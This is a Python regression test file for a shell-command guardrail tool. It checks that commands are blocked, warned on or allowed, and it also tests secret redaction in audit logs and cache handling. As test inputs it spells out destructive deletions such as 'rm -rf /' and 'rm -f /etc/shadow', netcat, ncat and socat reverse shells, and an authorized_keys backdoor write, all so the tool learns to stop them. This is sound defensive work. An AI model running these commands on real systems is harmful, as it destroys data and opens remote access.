"""Stage 1 regression tests: one guard per correctness/usability fix.

Each test pins a specific behavior that Stage 1 introduced, so a later change
that reintroduces the bug fails loudly here (in addition to the corpus-level
invariant checks in test_baseline_regression.py).
"""
from __future__ import annotations

import contextlib
import io
import json
import tempfile
import unittest
from pathlib import Path

from cybershell.audit import redact_command
from cybershell.cache import PrefixCache
from cybershell.cli import main
from cybershell.models import Decision, ShellContext
from cybershell.policy import PolicyRegistry
from cybershell.risk import GuardrailEngine


class TargetAwareRemovalTests(unittest.TestCase):
    """rm severity must depend on the resolved target, not just the flags."""

    def setUp(self) -> None:
        self.engine = GuardrailEngine.packaged()
        self.policy = PolicyRegistry.packaged().get("soc")

    def decide(self, command: str, cwd: str = ".") -> Decision:
        ctx = ShellContext(partial_command=command, cwd=cwd)
        return self.engine.assess(command, ctx, self.policy).decision

    def test_routine_relative_cleanup_is_allowed(self) -> None:
        for command in ("rm -rf node_modules", "rm -rf ./build", "rm -r logs", "rm -f config.txt"):
            with self.subTest(command=command):
                self.assertEqual(self.decide(command), Decision.ALLOW)

    def test_system_directory_removal_blocks(self) -> None:
        for command in ("rm -rf /etc", "rm -rf /etc/*", "rm -rf /home", "rm -rf /usr", "rm -rf ~"):
            with self.subTest(command=command):
                self.assertEqual(self.decide(command), Decision.BLOCK)

    def test_critical_file_removal_blocks(self) -> None:
        for command in ("rm /etc/passwd", "rm -f /etc/shadow"):
            with self.subTest(command=command):
                self.assertEqual(self.decide(command), Decision.BLOCK)

    def test_absolute_nonsystem_path_warns(self) -> None:
        self.assertEqual(self.decide("rm -rf /tmp/mycache"), Decision.WARN)

    def test_relative_resolving_into_system_dir_warns(self) -> None:
        # `rm -r logs` is harmless in a project, but inside /var/log it warns.
        self.assertEqual(self.decide("rm -r logs", cwd="/var/log"), Decision.WARN)

    def test_relative_cleanup_in_home_project_is_allowed(self) -> None:
        # Real-world cwd is almost always under /home; routine cleanup must not nag.
        for cwd in ("/home/alice/projects/app", "/home/bob/work", "/root/src"):
            for command in ("rm -rf node_modules", "rm -rf ./build", "rm -r dist"):
                with self.subTest(cwd=cwd, command=command):
                    self.assertEqual(self.decide(command, cwd=cwd), Decision.ALLOW)

    def test_whole_user_home_removal_blocks(self) -> None:
        self.assertEqual(self.decide("rm -rf /home/alice"), Decision.BLOCK)
        self.assertEqual(self.decide("rm -rf /home/*"), Decision.BLOCK)

    def test_block_is_context_free(self) -> None:
        # No ShellContext supplied (e.g. history-audit path) must still block.
        self.assertEqual(self.engine.assess("rm -rf /etc").decision, Decision.BLOCK)
        self.assertEqual(self.engine.assess("rm -rf /").decision, Decision.BLOCK)


class ReverseShellDetectionTests(unittest.TestCase):
    def setUp(self) -> None:
        self.engine = GuardrailEngine.packaged()

    def test_netcat_dash_e_reverse_shell_blocks(self) -> None:
        for command in (
            "nc -e /bin/bash 10.0.0.1 4444",
            "ncat --exec /bin/sh 10.0.0.1 9001",
            "socat TCP:10.0.0.1:4444 EXEC:/bin/sh",
        ):
            with self.subTest(command=command):
                self.assertEqual(self.engine.assess(command).decision, Decision.BLOCK)

    def test_benign_netcat_port_check_is_allowed(self) -> None:
        self.assertEqual(self.engine.assess("nc -zv example.com 80").decision, Decision.ALLOW)


class NoisyRuleTighteningTests(unittest.TestCase):
    def setUp(self) -> None:
        self.engine = GuardrailEngine.packaged()
        self.policy = PolicyRegistry.packaged().get("soc")

    def decide(self, command: str) -> Decision:
        ctx = ShellContext(partial_command=command, cwd=".")
        return self.engine.assess(command, ctx, self.policy).decision

    def test_authorized_keys_read_is_allowed(self) -> None:
        self.assertEqual(self.decide("ls -la ~/.ssh/authorized_keys"), Decision.ALLOW)
        self.assertEqual(self.decide("cat ~/.ssh/authorized_keys"), Decision.ALLOW)

    def test_authorized_keys_write_still_blocks(self) -> None:
        self.assertEqual(
            self.decide('echo "ssh-rsa AAAA" >> ~/.ssh/authorized_keys'), Decision.BLOCK
        )

    def test_env_substring_filenames_are_allowed(self) -> None:
        for command in ("cat notes.environment", "stat deploy.env.example", "ls environment.md"):
            with self.subTest(command=command):
                self.assertEqual(self.decide(command), Decision.ALLOW)

    def test_real_env_file_still_warns(self) -> None:
        self.assertEqual(self.decide("cat .env"), Decision.WARN)


class HistoryAuditLineNumberTests(unittest.TestCase):
    def invoke(self, *args: str) -> tuple[int, str]:
        out = io.StringIO()
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(io.StringIO()):
            code = main(list(args))
        return code, out.getvalue()

    def test_reports_real_file_line_numbers(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            history = Path(tmp) / "history.txt"
            history.write_text("ls\npwd\nid\nrm -rf /\nwhoami\n", encoding="utf-8")
            # limit smaller than the file forces the old (buggy) slice numbering to differ.
            code, out = self.invoke(
                "history-audit", "--history-file", str(history), "--limit", "3", "--json"
            )
            self.assertEqual(code, 0)
            payload = json.loads(out)
            risky = payload["risky_commands"]
            self.assertEqual(len(risky), 1)
            # rm -rf / is on physical line 4, not line 2 of the truncated window.
            self.assertEqual(risky[0]["line"], 4)
            self.assertIn("rm -rf /", risky[0]["command"])


class AuditRedactionTests(unittest.TestCase):
    def test_redact_command_masks_secrets(self) -> None:
        self.assertNotIn("ghp_secret", redact_command("export GITHUB_TOKEN=ghp_secret"))
        self.assertIn("<redacted>", redact_command("export GITHUB_TOKEN=ghp_secret"))
        self.assertNotIn("hunter2", redact_command("mysql --password hunter2 -u root"))
        self.assertEqual(redact_command("ls -la"), "ls -la")

    def test_audit_log_writes_redacted_command(self) -> None:
        from cybershell.audit import AuditLog
        from cybershell.engine import SuggestionEngine

        with tempfile.TemporaryDirectory() as tmp:
            audit_file = Path(tmp) / "audit.jsonl"
            engine = SuggestionEngine.packaged()
            result = engine.suggest(
                ShellContext(partial_command="export GITHUB_TOKEN=ghp_supersecret", cwd=".")
            )
            AuditLog(audit_file).write_result(result)
            contents = audit_file.read_text(encoding="utf-8")
            self.assertNotIn("ghp_supersecret", contents)
            self.assertIn("<redacted>", contents)


class CacheRobustnessTests(unittest.TestCase):
    def test_corrupt_cache_file_does_not_crash(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            cache_file = Path(tmp) / "cache.json"
            cache_file.write_text("{ this is not valid json", encoding="utf-8")
            cache = PrefixCache(path=cache_file)  # must not raise
            self.assertIsNone(cache.lookup("anything"))

    def test_non_object_cache_file_is_ignored(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            cache_file = Path(tmp) / "cache.json"
            cache_file.write_text("[1, 2, 3]", encoding="utf-8")
            cache = PrefixCache(path=cache_file)
            self.assertIsNone(cache.lookup("anything"))


if __name__ == "__main__":
    unittest.main()
